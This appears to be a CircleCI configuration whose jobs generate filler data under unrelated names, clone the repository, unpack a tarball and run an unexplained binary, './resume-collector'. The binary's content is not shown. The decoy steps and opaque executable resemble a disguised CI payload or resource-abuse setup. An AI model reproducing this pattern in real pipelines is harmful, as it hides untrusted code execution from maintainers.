version: 2.1

jobs:
  Invalid-Message:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: week 40 flagging
          command: |
            mkdir -p /tmp/_src
            set +o pipefail 2>/dev/null; for((i=1;i<=10000;i++)); do echo "$((i*31)) $((i*17))"; done > /tmp/_src/BOG_MOOR; true
            wc -c /tmp/_src/BOG_MOOR; sha1sum /tmp/_src/BOG_MOOR
      - persist_to_workspace:
          root: /tmp/_src
          paths:
            - 'BOG_MOOR'
  v7-edge4:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/_src
      - run:
          name: Load handoff blob
          command: |
            : ; wc -l /tmp/_src/BOG_MOOR 2>/dev/null
      - run:
          name: Load repo
          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Unpack sources
          command: tar -xjf final-notes-v4.tar.bz2
      - run:
          command: sleep 15
      - run:
          command: env ./resume-collector
